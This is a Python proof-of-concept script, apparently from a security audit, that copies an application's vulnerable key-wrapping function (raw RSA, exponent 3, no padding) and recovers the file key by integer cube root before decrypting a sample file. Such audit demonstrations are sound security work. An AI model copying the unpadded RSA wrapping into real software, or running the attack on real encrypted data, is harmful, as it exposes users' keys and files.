import os
import sys
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric import rsa

# Ajout de la racine du projet au PATH
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(ROOT_DIR))

from app.crypto_utils import decrypt_bytes, encrypt_bytes


def wrap_key_vulnerable(file_key: bytes, public_key) -> bytes:
    """Copie de wrap_key du code audite (app/sharing.py, lignes 30 a 37)."""
    n = public_key.public_numbers().n
    e = public_key.public_numbers().e
    m = int.from_bytes(file_key, "big")
    c = pow(m, e, n)  # RSA brut, sans padding
    return c.to_bytes(public_key.key_size // 8, "big")


def integer_cbrt(n: int) -> int:
    """Racine cubique entiere exacte sur grands entiers."""
    low, high = 1, 1 << ((n.bit_length() + 2) // 3)
    while low < high:
        mid = (low + high + 1) // 2
        if mid**3 <= n:
            low = mid
        else:
            high = mid - 1
    return low


# 1. Lecture du fichier de test existant
contenu_original = (ROOT_DIR / "exemples" / "rapport.txt").read_bytes()

# 2. Chiffrement du fichier avec une cle aleatoire de 32 octets
file_key = os.urandom(32)
blob = encrypt_bytes(contenu_original, file_key)

# 3. Chiffrement RSA vulnerable (e = 3, sans padding), comme dans le code audite
priv_bob = rsa.generate_private_key(public_exponent=3, key_size=2048)
wrapped_key = wrap_key_vulnerable(file_key, priv_bob.public_key())

# 4. Attaque : racine cubique entiere du chiffre RSA (sans la cle privee)
c = int.from_bytes(wrapped_key, "big")
recovered_key = integer_cbrt(c).to_bytes(32, "big")

# 5. Dechiffrement du contenu avec la cle recuperee
texte_dechiffre = decrypt_bytes(blob, recovered_key)
assert recovered_key == file_key and texte_dechiffre == contenu_original

print("[+] Cle aleatoire generee :", file_key.hex())
print("[+] Cle aleatoire extraite :", recovered_key.hex())
print("[+] Contenu du fichier recupere :\n")
print(texte_dechiffre.decode("utf-8"))
